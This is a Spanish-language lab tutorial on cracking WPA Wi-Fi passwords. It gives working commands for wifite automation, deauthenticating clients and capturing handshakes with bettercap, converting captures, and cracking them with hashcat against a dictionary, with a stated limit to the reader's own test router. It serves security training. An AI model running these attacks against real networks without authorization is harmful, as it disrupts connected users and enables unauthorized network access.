# Práctica y Herramientas

## Requisitos del laboratorio
- **Hardware**: una tarjeta de red compatible con modo monitor e inyección de paquetes (ej. Alfa AWUS036NHA — la tarjeta Wi-Fi integrada de una laptop normalmente NO sirve para esto).
- **Entorno**: Kali Linux o Parrot OS.
- **Objetivo**: siempre un router **propio** de pruebas — nunca una red ajena sin autorización.

## Automatización todo-en-uno: Wifite
`wifite` automatiza herramientas como `aircrack-ng` y `hcxdumptool`, probando varios ataques en secuencia sin necesitar ejecutar cada paso manualmente.

```bash
sudo airmon-ng check kill      # detener procesos que puedan interferir
sudo airmon-ng start wlan0     # poner la tarjeta en modo monitor
sudo wifite --kill
```

**Qué hace por debajo, en orden:** prueba WPS Pixie Dust → busca PMKID → espera o fuerza handshakes → intenta crackear con un diccionario básico incluido.

## Control total: Bettercap
Framework avanzado escrito en Go, con control granular sobre el espectro de red — más estable que Wifite para ataques interactivos donde quieren decidir cada paso.

```bash
sudo bettercap -iface wlan0
```

Dentro de la consola de Bettercap:
```
wifi.recon on
set wifi.handshakes.file capturas.pcap    # auto-guardar handshakes capturados
wifi.deauth MAC_DEL_ROUTER                # forzar desconexión de clientes para capturar el handshake
```

## Crackeo final: Hashcat
Una vez capturado el handshake (archivo `.pcap`) con Bettercap o Wifite, hay que extraer la contraseña.

1. **Convertir el archivo al formato que Hashcat entiende:**
   ```bash
   hcxpcapngtool -o hashes.hc22000 capturas.pcap
   ```
2. **Crackear con diccionario:**
   ```bash
   hashcat -m 22000 hashes.hc22000 diccionario_rockyou.txt
   ```
   El `-m 22000` indica el modo específico para handshakes WPA-PBKDF2 en formato hc22000.

## Flujo completo resumido
1. Poner la tarjeta en modo monitor.
2. Capturar handshake o PMKID (con Wifite automáticamente, o con Bettercap paso a paso).
3. Convertir la captura al formato de Hashcat.
4. Crackear con diccionario (o fuerza bruta si el diccionario falla y tienen una pista del formato de la contraseña).
